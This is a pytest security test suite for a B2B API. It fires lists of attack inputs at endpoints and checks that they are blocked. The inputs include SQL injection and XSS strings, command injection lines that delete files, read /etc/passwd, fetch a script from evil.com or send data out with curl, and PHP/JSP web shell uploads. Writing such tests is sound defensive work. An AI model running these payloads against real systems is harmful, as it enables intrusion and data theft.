"""
GridWorks B2B Services - Security and Penetration Tests
Comprehensive security testing for all service components
"""

import pytest
import pytest_asyncio
from httpx import AsyncClient
import json
import base64
import hashlib
import secrets
from datetime import datetime, timedelta
from unittest.mock import patch, AsyncMock

from ...main import app
from ...config import settings


class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""
    
    async def test_sql_injection_protection(self, test_client: AsyncClient, override_auth_dependencies):
        """Test protection against SQL injection attacks."""
        
        # SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM api_keys; --",
            "' OR 1=1 LIMIT 1 --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; INSERT INTO users (name) VALUES ('hacker'); --"
        ]
        
        # Test SQL injection in various endpoints
        vulnerable_endpoints = [
            {
                "method": "POST",
                "endpoint": "/api/v1/ai-services/support/query",
                "payload_field": "user_message",
                "base_data": {
                    "user_message": "PAYLOAD_HERE",
                    "language": "en",
                    "user_context": {"user_id": "test"},
                    "conversation_history": [],
                    "channel": "api"
                }
            },
            {
                "method": "POST", 
                "endpoint": "/api/v1/partners/api-keys",
                "payload_field": "name",
                "base_data": {
                    "name": "PAYLOAD_HERE",
                    "permissions": ["ai_suite.read"],
                    "rate_limit": 1000,
                    "expires_in_days": 30
                }
            }
        ]
        
        for endpoint_config in vulnerable_endpoints:
            for payload in sql_injection_payloads:
                # Inject SQL payload into request
                test_data = endpoint_config["base_data"].copy()
                test_data[endpoint_config["payload_field"]] = payload
                
                if endpoint_config["method"] == "POST":
                    response = await test_client.post(endpoint_config["endpoint"], json=test_data)
                else:
                    response = await test_client.get(endpoint_config["endpoint"], params=test_data)
                
                # Verify SQL injection was blocked
                assert response.status_code != 500, f"SQL injection caused server error at {endpoint_config['endpoint']}"
                
                # Should either be rejected (400/422) or safely handled (200 with sanitized input)
                assert response.status_code in [200, 400, 422], f"Unexpected response {response.status_code} for SQL injection test"
                
                # If response is 200, verify the payload was sanitized
                if response.status_code == 200 and "json" in response.headers.get("content-type", ""):
                    response_data = response.json()
                    response_text = json.dumps(response_data).lower()
                    
                    # Verify dangerous SQL keywords are not in response
                    dangerous_keywords = ["drop", "delete", "insert", "update", "select", "union"]
                    for keyword in dangerous_keywords:
                        assert keyword not in response_text, f"SQL injection payload '{payload}' not properly sanitized"
    
    async def test_xss_protection(self, test_client: AsyncClient, override_auth_dependencies):
        """Test protection against Cross-Site Scripting (XSS) attacks."""
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "'><script>alert('xss')</script>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>Click me</div>",
            "javascript:void(0)/*-*/,/**/alert('xss')/**/",
            "<img src='x' onerror='alert(\"xss\")'>"
        ]
        
        # Test XSS in AI support messages
        for payload in xss_payloads:
            request_data = {
                "user_message": payload,
                "language": "en",
                "user_context": {"user_id": "xss_test_user"},
                "conversation_history": [],
                "channel": "api"
            }
            
            response = await test_client.post(
                "/api/v1/ai-services/support/query",
                json=request_data
            )
            
            assert response.status_code in [200, 400, 422], f"XSS test failed with status {response.status_code}"
            
            if response.status_code == 200:
                response_data = response.json()
                response_text = response_data.get("response_text", "")
                
                # Verify XSS payload was sanitized
                assert "<script>" not in response_text, f"XSS payload not sanitized: {payload}"
                assert "javascript:" not in response_text, f"JavaScript protocol not blocked: {payload}"
                assert "onerror=" not in response_text, f"Event handler not sanitized: {payload}"
                assert "onload=" not in response_text, f"Event handler not sanitized: {payload}"
    
    async def test_command_injection_protection(self, test_client: AsyncClient, override_auth_dependencies):
        """Test protection against command injection attacks."""
        
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/passwd)",
            "; wget http://evil.com/malware.sh",
            "| nc -l 4444",
            "&& curl evil.com/exfiltrate?data=$(cat /etc/passwd)",
            "; python -c 'import os; os.system(\"ls\")'",
            "| powershell.exe -Command \"Get-Process\""
        ]
        
        # Test command injection in various input fields
        for payload in command_injection_payloads:
            # Test in AI support request
            ai_request = {
                "user_message": f"Help me understand {payload}",
                "language": "en",
                "user_context": {"user_id": "cmd_test_user"},
                "conversation_history": [],
                "channel": "api"
            }
            
            response = await test_client.post(
                "/api/v1/ai-services/support/query",
                json=ai_request
            )
            
            assert response.status_code in [200, 400, 422], f"Command injection test failed with status {response.status_code}"
            
            # Verify no command execution occurred by checking response doesn't contain system information
            if response.status_code == 200:
                response_data = response.json()
                response_text = response_data.get("response_text", "").lower()
                
                # Check for signs of command execution
                system_info_indicators = [
                    "root:", "bin/bash", "etc/passwd", "system32", "administrator",
                    "process", "directory", "permission denied", "command not found"
                ]
                
                for indicator in system_info_indicators:
                    assert indicator not in response_text, f"Command injection may have succeeded: {payload}"
    
    async def test_path_traversal_protection(self, test_client: AsyncClient, override_auth_dependencies):
        """Test protection against path traversal attacks."""
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../proc/self/environ",
            "..\\..\\..\\boot.ini",
            "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
            "file:///etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        ]
        
        # Test path traversal in file-related endpoints (if any)
        for payload in path_traversal_payloads:
            # Test in API key name (could be used for file operations)
            api_key_request = {
                "name": payload,
                "permissions": ["ai_suite.read"],
                "rate_limit": 1000,
                "expires_in_days": 30
            }
            
            response = await test_client.post(
                "/api/v1/partners/api-keys",
                json=api_key_request
            )
            
            # Should either reject the request or sanitize the input
            assert response.status_code in [200, 400, 422], f"Path traversal test failed with status {response.status_code}"
            
            if response.status_code == 200:
                response_data = response.json()
                created_name = response_data.get("name", "")
                
                # Verify path traversal characters were sanitized
                assert "../" not in created_name, f"Path traversal not sanitized: {payload}"
                assert "..\\" not in created_name, f"Path traversal not sanitized: {payload}"
                assert "%2e%2e" not in created_name, f"Encoded path traversal not sanitized: {payload}"


class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms."""
    
    async def test_jwt_token_security(self, test_client: AsyncClient, test_enterprise_client):
        """Test JWT token security vulnerabilities."""
        
        # Test JWT None Algorithm Attack
        import jwt
        
        # Create malicious token with 'none' algorithm
        malicious_payload = {
            "client_id": str(test_enterprise_client.id),
            "user_id": "malicious_user",
            "email": "hacker@evil.com",
            "roles": ["admin"],
            "permissions": ["admin.*"],
            "tier": "quantum",
            "exp": datetime.utcnow() + timedelta(hours=24)
        }
        
        # Try 'none' algorithm attack
        none_token = jwt.encode(malicious_payload, "", algorithm="none")
        
        headers = {"Authorization": f"Bearer {none_token}"}
        response = await test_client.get("/api/v1/partners/profile", headers=headers)
        
        # Should reject 'none' algorithm tokens
        assert response.status_code == 401, "JWT 'none' algorithm attack not blocked"
        
        # Test weak secret attack
        weak_secrets = ["secret", "123456", "password", "admin", "test"]
        
        for weak_secret in weak_secrets:
            try:
                weak_token = jwt.encode(malicious_payload, weak_secret, algorithm="HS256")
                
                headers = {"Authorization": f"Bearer {weak_token}"}
                response = await test_client.get("/api/v1/partners/profile", headers=headers)
                
                # Should reject tokens signed with weak secrets
                assert response.status_code == 401, f"JWT signed with weak secret '{weak_secret}' was accepted"
                
            except Exception:
                # Expected if JWT library rejects weak secrets
                pass
        
        # Test token manipulation
        valid_token_parts = jwt.encode(malicious_payload, settings.JWT_SECRET_KEY, algorithm="HS256").split('.')
        
        # Tamper with payload
        tampered_payload = base64.urlsafe_b64encode(
            json.dumps({"admin": True, "permissions": ["*"]}).encode()
        ).decode().rstrip('=')
        
        tampered_token = f"{valid_token_parts[0]}.{tampered_payload}.{valid_token_parts[2]}"
        
        headers = {"Authorization": f"Bearer {tampered_token}"}
        response = await test_client.get("/api/v1/partners/profile", headers=headers)
        
        # Should reject tampered tokens
        assert response.status_code == 401, "Tampered JWT token was accepted"
    
    async def test_api_key_security(self, test_client: AsyncClient, test_api_key):
        """Test API key security vulnerabilities."""
        
        # Test API key enumeration
        common_api_key_patterns = [
            "gw_test_" + "a" * 32,
            "gw_test_" + "0" * 32,
            "gw_prod_" + secrets.token_urlsafe(32),
            "gw_dev_" + secrets.token_urlsafe(32),
            settings.API_KEY_PREFIX + "admin",
            settings.API_KEY_PREFIX + "test123"
        ]
        
        for test_key in common_api_key_patterns:
            headers = {"X-API-Key": test_key}
            response = await test_client.get("/api/v1/partners/services/available", headers=headers)
            
            # Should reject invalid API keys
            assert response.status_code == 401, f"Invalid API key '{test_key}' was accepted"
        
        # Test API key brute force protection
        failed_attempts = 0
        
        for attempt in range(20):  # Try multiple invalid keys rapidly
            invalid_key = settings.API_KEY_PREFIX + secrets.token_urlsafe(32)
            headers = {"X-API-Key": invalid_key}
            
            response = await test_client.get("/api/v1/partners/services/available", headers=headers)
            
            if response.status_code == 401:
                failed_attempts += 1
            elif response.status_code == 429:  # Rate limited
                # Good - brute force protection is working
                break
        
        # Should have rate limiting or account lockout after multiple failures
        assert failed_attempts < 20, "No brute force protection detected for API keys"
    
    async def test_session_security(self, test_client: AsyncClient, test_enterprise_client, test_user):
        """Test session management security."""
        
        # Test session fixation
        # Get initial session
        response1 = await test_client.get("/api/v1/partners/profile")
        session_cookies = response1.cookies
        
        # Login with existing session
        login_data = {
            "email": test_user.email,
            "password": "test_password_123"
        }
        
        with patch('bcrypt.checkpw', return_value=True):
            login_response = await test_client.post(
                "/api/v1/auth/login",
                json=login_data,
                cookies=session_cookies
            )
        
        if login_response.status_code == 200:
            # Session ID should change after login to prevent fixation
            new_session_cookies = login_response.cookies
            
            # If using session cookies, they should be different
            for cookie_name in session_cookies:
                if cookie_name in new_session_cookies:
                    assert session_cookies[cookie_name] != new_session_cookies[cookie_name], \
                        "Session fixation vulnerability detected"
        
        # Test concurrent session limits
        tokens = []
        
        # Create multiple sessions for same user
        for i in range(10):
            with patch('bcrypt.checkpw', return_value=True):
                login_response = await test_client.post("/api/v1/auth/login", json=login_data)
            
            if login_response.status_code == 200:
                token_data = login_response.json()
                tokens.append(token_data.get("access_token"))
        
        # Test if old sessions are invalidated (session limit enforcement)
        active_sessions = 0
        for token in tokens:
            if token:
                headers = {"Authorization": f"Bearer {token}"}
                response = await test_client.get("/api/v1/partners/profile", headers=headers)
                if response.status_code == 200:
                    active_sessions += 1
        
        # Should limit concurrent sessions to prevent session sprawl
        assert active_sessions <= 5, f"Too many concurrent sessions allowed: {active_sessions}"


class TestDataPrivacySecurity:
    """Security tests for data privacy and protection."""
    
    async def test_sensitive_data_exposure(self, test_client: AsyncClient, override_auth_dependencies):
        """Test for sensitive data exposure in responses."""
        
        # Test API responses don't expose sensitive information
        sensitive_patterns = [
            r"password",
            r"secret",
            r"private_key",
            r"api_key",
            r"token",
            r"ssn",
            r"social_security",
            r"credit_card",
            r"bank_account",
            settings.JWT_SECRET_KEY[:10] if settings.JWT_SECRET_KEY else "jwt_secret"
        ]
        
        # Test various endpoints
        test_endpoints = [
            {"method": "GET", "url": "/api/v1/partners/profile"},
            {"method": "GET", "url": "/api/v1/partners/services/available"},
            {"method": "POST", "url": "/api/v1/ai-services/support/query", "json": {
                "user_message": "What is your system configuration?",
                "language": "en",
                "user_context": {"user_id": "test"},
                "conversation_history": [],
                "channel": "api"
            }}
        ]
        
        for endpoint in test_endpoints:
            if endpoint["method"] == "POST":
                response = await test_client.post(endpoint["url"], json=endpoint.get("json"))
            else:
                response = await test_client.get(endpoint["url"])
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                        f"Sensitive data '{pattern}' exposed in {endpoint['url']} response"
    
    async def test_pii_data_handling(self, test_client: AsyncClient, override_auth_dependencies):
        """Test proper handling of Personally Identifiable Information (PII)."""
        
        # Test PII in AI support requests
        pii_test_cases = [
            {
                "message": "My credit card number is 4532-1234-5678-9012",
                "pii_type": "credit_card"
            },
            {
                "message": "My SSN is 123-45-6789",
                "pii_type": "ssn"
            },
            {
                "message": "My email is john.doe@example.com and phone is 555-123-4567",
                "pii_type": "contact_info"
            },
            {
                "message": "My bank account number is 123456789012",
                "pii_type": "bank_account"
            }
        ]
        
        for test_case in pii_test_cases:
            request_data = {
                "user_message": test_case["message"],
                "language": "en",
                "user_context": {"user_id": "pii_test_user"},
                "conversation_history": [],
                "channel": "api"
            }
            
            response = await test_client.post(
                "/api/v1/ai-services/support/query",
                json=request_data
            )
            
            assert response.status_code == 200, f"PII test failed for {test_case['pii_type']}"
            
            response_data = response.json()
            response_text = response_data.get("response_text", "")
            
            # Verify PII is not echoed back in response
            if test_case["pii_type"] == "credit_card":
                assert "4532-1234-5678-9012" not in response_text, "Credit card number exposed in response"
            elif test_case["pii_type"] == "ssn":
                assert "123-45-6789" not in response_text, "SSN exposed in response"
            elif test_case["pii_type"] == "bank_account":
                assert "123456789012" not in response_text, "Bank account number exposed in response"
    
    async def test_data_encryption_requirements(self, test_client: AsyncClient, override_auth_dependencies):
        """Test data encryption in transit and at rest."""
        
        # Test HTTPS enforcement
        # Note: In test environment, we verify security headers instead
        
        response = await test_client.get("/api/v1/partners/profile")
        
        # Check security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security"
        ]
        
        for header in security_headers:
            assert header in response.headers, f"Missing security header: {header}"
        
        # Verify HSTS header value
        if "Strict-Transport-Security" in response.headers:
            hsts_value = response.headers["Strict-Transport-Security"]
            assert "max-age=" in hsts_value, "HSTS header missing max-age directive"
            assert "includeSubDomains" in hsts_value, "HSTS header missing includeSubDomains"
        
        # Test encrypted fields in anonymous services
        anonymous_request = {
            "portfolio_data": {
                "holdings": [{"symbol": "SENSITIVE_HOLDING", "value": 1000000}],
                "total_value": 1000000,
                "currency": "USD"
            },
            "privacy_tier": "void",
            "proof_requirements": ["portfolio_ownership"],
            "user_context": {"user_id": "encryption_test_user"},
            "verification_parameters": {"min_net_worth": 500000}
        }
        
        response = await test_client.post(
            "/api/v1/anonymous-services/zk-proof/generate",
            json=anonymous_request
        )
        
        if response.status_code == 200:
            response_data = response.json()
            proof_data = response_data.get("proof_data", {})
            
            # Verify sensitive data is not in plaintext
            proof_json = json.dumps(proof_data)
            assert "SENSITIVE_HOLDING" not in proof_json, "Sensitive holding data not encrypted"
            assert "1000000" not in proof_json, "Portfolio value not encrypted"


class TestAPISecurityVulnerabilities:
    """Tests for common API security vulnerabilities."""
    
    async def test_cors_security(self, test_client: AsyncClient):
        """Test CORS (Cross-Origin Resource Sharing) security."""
        
        # Test CORS with malicious origins
        malicious_origins = [
            "http://evil.com",
            "https://attacker.domain.com",
            "null",
            "file://",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for origin in malicious_origins:
            headers = {"Origin": origin}
            response = await test_client.options("/api/v1/partners/profile", headers=headers)
            
            # Should not allow malicious origins
            cors_origin = response.headers.get("Access-Control-Allow-Origin")
            assert cors_origin != origin, f"CORS allows malicious origin: {origin}"
            assert cors_origin != "*", "CORS allows all origins (security risk)"
        
        # Test CORS preflight security
        preflight_headers = {
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "X-Requested-With, Content-Type, Authorization"
        }
        
        response = await test_client.options("/api/v1/ai-services/support/query", headers=preflight_headers)
        
        # Should reject preflight from unauthorized origins
        assert response.headers.get("Access-Control-Allow-Origin") != "https://evil.com", \
            "CORS preflight allows unauthorized origin"
    
    async def test_http_method_security(self, test_client: AsyncClient):
        """Test HTTP method security vulnerabilities."""
        
        # Test for allowed methods on endpoints
        sensitive_endpoints = [
            "/api/v1/partners/profile",
            "/api/v1/partners/api-keys",
            "/api/v1/ai-services/support/query"
        ]
        
        dangerous_methods = ["TRACE", "TRACK", "CONNECT", "DEBUG"]
        
        for endpoint in sensitive_endpoints:
            for method in dangerous_methods:
                # Use httpx client directly for custom methods
                response = await test_client.request(method, endpoint)
                
                # Should reject dangerous HTTP methods
                assert response.status_code in [405, 501], \
                    f"Dangerous HTTP method {method} allowed on {endpoint}"
        
        # Test HTTP verb tampering
        post_endpoints = [
            "/api/v1/ai-services/support/query",
            "/api/v1/partners/api-keys"
        ]
        
        for endpoint in post_endpoints:
            # Try to bypass POST requirement with GET + X-HTTP-Method-Override
            headers = {"X-HTTP-Method-Override": "POST"}
            response = await test_client.get(endpoint, headers=headers)
            
            # Should not allow method override for sensitive operations
            assert response.status_code != 200 or "error" in response.text.lower(), \
                f"HTTP method override bypass detected on {endpoint}"
    
    async def test_content_type_security(self, test_client: AsyncClient, override_auth_dependencies):
        """Test content type security vulnerabilities."""
        
        # Test content type confusion attacks
        malicious_content_types = [
            "text/xml",
            "application/x-www-form-urlencoded", 
            "multipart/form-data",
            "text/plain",
            "application/xml"
        ]
        
        json_endpoints = [
            "/api/v1/ai-services/support/query",
            "/api/v1/partners/api-keys"
        ]
        
        for endpoint in json_endpoints:
            for content_type in malicious_content_types:
                # Try to send JSON data with wrong content type
                headers = {"Content-Type": content_type}
                json_data = {
                    "user_message": "test",
                    "language": "en",
                    "user_context": {"user_id": "test"},
                    "conversation_history": [],
                    "channel": "api"
                }
                
                response = await test_client.post(
                    endpoint,
                    json=json_data,
                    headers=headers
                )
                
                # Should reject or safely handle wrong content types
                assert response.status_code in [400, 415, 422], \
                    f"Content type confusion attack succeeded with {content_type} on {endpoint}"
    
    async def test_file_upload_security(self, test_client: AsyncClient, override_auth_dependencies):
        """Test file upload security (if file uploads are supported)."""
        
        # Test malicious file uploads
        malicious_files = [
            {
                "filename": "test.php",
                "content": b"<?php system($_GET['cmd']); ?>",
                "content_type": "application/x-php"
            },
            {
                "filename": "test.jsp",
                "content": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "content_type": "application/x-jsp"
            },
            {
                "filename": "test.exe",
                "content": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00",  # PE header
                "content_type": "application/octet-stream"
            },
            {
                "filename": "../../../etc/passwd",
                "content": b"root:x:0:0:root:/root:/bin/bash",
                "content_type": "text/plain"
            }
        ]
        
        # Look for file upload endpoints
        file_upload_endpoints = [
            "/api/v1/partners/documents/upload",
            "/api/v1/compliance/documents/upload",
            "/api/v1/profile/avatar/upload"
        ]
        
        for endpoint in file_upload_endpoints:
            for malicious_file in malicious_files:
                # Test file upload
                files = {
                    "file": (
                        malicious_file["filename"],
                        malicious_file["content"],
                        malicious_file["content_type"]
                    )
                }
                
                # Try uploading malicious file
                response = await test_client.post(endpoint, files=files)
                
                # Endpoint might not exist (404) or should reject malicious files
                if response.status_code not in [404, 405]:  # Endpoint exists
                    assert response.status_code in [400, 403, 413, 415], \
                        f"Malicious file upload not blocked: {malicious_file['filename']} to {endpoint}"


class TestBusinessLogicSecurity:
    """Tests for business logic security vulnerabilities."""
    
    async def test_authorization_bypass(self, test_client: AsyncClient):
        """Test for authorization bypass vulnerabilities."""
        
        # Test access without authentication
        protected_endpoints = [
            {"method": "GET", "url": "/api/v1/partners/profile"},
            {"method": "GET", "url": "/api/v1/partners/api-keys"},
            {"method": "POST", "url": "/api/v1/partners/api-keys", "json": {
                "name": "Unauthorized Key",
                "permissions": ["admin.*"],
                "rate_limit": 10000,
                "expires_in_days": 365
            }}
        ]
        
        for endpoint in protected_endpoints:
            if endpoint["method"] == "POST":
                response = await test_client.post(endpoint["url"], json=endpoint.get("json"))
            else:
                response = await test_client.get(endpoint["url"])
            
            # Should require authentication
            assert response.status_code == 401, \
                f"Authorization bypass: {endpoint['method']} {endpoint['url']} accessible without auth"
        
        # Test privilege escalation
        with patch('...auth.enterprise_auth.get_current_user') as mock_auth:
            # Mock user with limited permissions
            mock_auth.return_value.permissions = ["ai_suite.read"]
            mock_auth.return_value.roles = ["user"]
            
            # Try to create admin API key
            admin_key_request = {
                "name": "Admin Escalation Key",
                "permissions": ["admin.*", "system.*"],
                "rate_limit": 100000,
                "expires_in_days": 365
            }
            
            response = await test_client.post("/api/v1/partners/api-keys", json=admin_key_request)
            
            # Should be denied due to insufficient privileges
            assert response.status_code == 403, "Privilege escalation not prevented"
    
    async def test_rate_limit_bypass(self, test_client: AsyncClient, test_api_key):
        """Test for rate limit bypass vulnerabilities."""
        
        api_headers = {"X-API-Key": test_api_key._test_key_value}
        
        # Test rate limit bypass techniques
        bypass_techniques = [
            # Different user agents
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            {"User-Agent": "curl/7.68.0"},
            {"User-Agent": "PostmanRuntime/7.28.0"},
            
            # Different IP headers
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.100"},
            {"X-Originating-IP": "10.0.0.1"},
            
            # Case variations
            {"x-api-key": test_api_key._test_key_value},
            {"X-Api-Key": test_api_key._test_key_value},
        ]
        
        # Make requests with bypass techniques
        for technique_headers in bypass_techniques:
            combined_headers = {**api_headers, **technique_headers}
            
            # Make multiple rapid requests
            responses = []
            for i in range(20):
                response = await test_client.get(
                    "/api/v1/partners/services/available",
                    headers=combined_headers
                )
                responses.append(response.status_code)
            
            # Should eventually hit rate limits regardless of bypass attempts
            rate_limited = any(status == 429 for status in responses)
            
            # If rate limiting is implemented, should trigger even with bypass attempts
            if any(status == 200 for status in responses):
                # Some requests succeeded, so rate limiting might not be implemented
                # or bypass technique might be working
                pass
    
    async def test_business_logic_flaws(self, test_client: AsyncClient, override_auth_dependencies):
        """Test for business logic flaws."""
        
        # Test negative value handling
        negative_value_tests = [
            {
                "endpoint": "/api/v1/partners/api-keys",
                "data": {
                    "name": "Negative Rate Limit Key",
                    "permissions": ["ai_suite.read"],
                    "rate_limit": -1000,  # Negative rate limit
                    "expires_in_days": 30
                }
            },
            {
                "endpoint": "/api/v1/anonymous-services/zk-proof/generate", 
                "data": {
                    "portfolio_data": {
                        "holdings": [{"symbol": "TEST", "value": -1000000}],  # Negative value
                        "total_value": -1000000,
                        "currency": "USD"
                    },
                    "privacy_tier": "onyx",
                    "proof_requirements": ["portfolio_ownership"],
                    "user_context": {"user_id": "negative_test"},
                    "verification_parameters": {"min_net_worth": 500000}
                }
            }
        ]
        
        for test_case in negative_value_tests:
            response = await test_client.post(test_case["endpoint"], json=test_case["data"])
            
            # Should reject negative values or handle them safely
            assert response.status_code in [400, 422], \
                f"Negative value not properly validated at {test_case['endpoint']}"
        
        # Test boundary value attacks
        boundary_tests = [
            {
                "endpoint": "/api/v1/partners/api-keys",
                "data": {
                    "name": "A" * 10000,  # Extremely long name
                    "permissions": ["ai_suite.read"],
                    "rate_limit": 999999999999999999,  # Very large number
                    "expires_in_days": 99999
                }
            }
        ]
        
        for test_case in boundary_tests:
            response = await test_client.post(test_case["endpoint"], json=test_case["data"])
            
            # Should validate boundary conditions
            assert response.status_code in [400, 422], \
                f"Boundary value attack not prevented at {test_case['endpoint']}"


class TestSecurityCompliance:
    """Tests for security compliance requirements."""
    
    async def test_audit_logging_security(self, test_client: AsyncClient, override_auth_dependencies):
        """Test security of audit logging mechanisms."""
        
        # Test that sensitive operations are logged
        sensitive_operations = [
            {
                "action": "api_key_creation",
                "endpoint": "/api/v1/partners/api-keys",
                "method": "POST",
                "data": {
                    "name": "Audit Test Key",
                    "permissions": ["ai_suite.read"],
                    "rate_limit": 1000,
                    "expires_in_days": 30
                }
            }
        ]
        
        for operation in sensitive_operations:
            # Perform sensitive operation
            if operation["method"] == "POST":
                response = await test_client.post(operation["endpoint"], json=operation["data"])
            else:
                response = await test_client.get(operation["endpoint"])
            
            # Operation should succeed and be logged
            if response.status_code in [200, 201]:
                # Verify audit logging occurred (implementation specific)
                # This would typically check audit log entries in database
                pass
        
        # Test audit log tampering protection
        # Attempt to inject malicious data into audit logs
        log_injection_payloads = [
            "\n[FAKE LOG ENTRY] admin accessed system",
            "\r\nERROR: System compromised",
            "\\n\\t[INJECTED] Unauthorized access granted"
        ]
        
        for payload in log_injection_payloads:
            audit_test_data = {
                "name": f"Test {payload}",
                "permissions": ["ai_suite.read"],
                "rate_limit": 1000,
                "expires_in_days": 30
            }
            
            response = await test_client.post("/api/v1/partners/api-keys", json=audit_test_data)
            
            # Should sanitize input to prevent log injection
            # Check that response doesn't contain unsanitized input
            if response.status_code in [200, 400, 422]:
                response_text = response.text
                assert payload not in response_text, f"Log injection payload not sanitized: {payload}"
    
    async def test_data_retention_compliance(self, test_client: AsyncClient, override_auth_dependencies):
        """Test data retention compliance mechanisms."""
        
        # Test data deletion capabilities
        deletion_test_data = {
            "request_type": "data_deletion",
            "data_categories": ["api_usage_logs", "conversation_history"],
            "retention_override": False,
            "compliance_reason": "user_request"
        }
        
        # This endpoint might not exist in test environment
        response = await test_client.post("/api/v1/compliance/data-retention/delete", json=deletion_test_data)
        
        # If endpoint exists, should have proper authorization
        if response.status_code not in [404, 405]:
            assert response.status_code in [200, 202, 403], \
                "Data deletion endpoint has unexpected behavior"
        
        # Test data anonymization
        anonymization_request = {
            "request_type": "data_anonymization",
            "user_identifiers": ["test_user_123"],
            "preserve_analytics": True,
            "anonymization_method": "k_anonymity"
        }
        
        response = await test_client.post("/api/v1/compliance/data-retention/anonymize", json=anonymization_request)
        
        # If endpoint exists, should have proper controls
        if response.status_code not in [404, 405]:
            assert response.status_code in [200, 202, 403], \
                "Data anonymization endpoint has unexpected behavior"